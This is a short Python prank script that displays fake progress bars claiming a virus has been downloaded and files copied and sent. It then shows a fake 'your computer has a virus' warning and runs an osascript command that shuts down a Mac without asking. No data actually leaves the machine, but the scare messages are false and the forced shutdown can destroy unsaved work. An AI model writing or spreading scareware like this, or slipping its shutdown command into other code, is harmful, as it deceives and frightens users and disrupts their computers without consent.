import tkinter
from tkinter import messagebox
import turtle
import time
from tqdm import tqdm
import os

root = tkinter.Tk()
root.withdraw()

print("               _ _               _           ")
print("  ___ ___   __| (_)_ __   __ _  | |__  _   _ ")
print(" / __/ _ \ / _` | | '_ \ / _` | | '_ \| | | |")
print("| (_| (_) | (_| | | | | | (_| | | |_) | |_| |")
print(" \___\___/ \__,_|_|_| |_|\__, | |_.__/ \__, |")
print("                         |___/         |___/ \n")
print(" _   _                      _   _                               _       _   ")
print("| |_| |__   ___ _ __  _   _| |_| |__   ___  _ __  ___  ___ _ __(_)_ __ | |_ ")
print("| __| '_ \ / _ \ '_ \| | | | __| '_ \ / _ \| '_ \/ __|/ __| '__| | '_ \| __|")
print("| |_| | | |  __/ |_) | |_| | |_| | | | (_) | | | \__ \ (__| |  | | |_) | |_ ")
print(" \__|_| |_|\___| .__/ \__, |\__|_| |_|\___/|_| |_|___/\___|_|  |_| .__/ \__|")
print("               |_|    |___/                                      |_|        ")

for x in tqdm(range(1000)): #creates progress bar
    time.sleep(0.001); 
print("virus downloaded")
for x in tqdm(range(1000)): #creates other progress bar
    time.sleep(0.001);
print("libraries downloaded")
for x in tqdm(range(1000)): #creates other progress bar
    time.sleep(0.001);
print("files copied")
for x in tqdm(range(1000)): #creates other progress bar
    time.sleep(0.01);
print("files sent")

time.sleep(1) #dont do anything for 1 second

messagebox.showwarning("Warning","Warning ,your computer has a virus.") #creates fake pop up
cmd = """osascript -e 'tell app "Finder" to shutdown'""" #shuts down mac
def shutdown(): #create function named shutdown
     os.system(cmd)
shutdown() #executes function


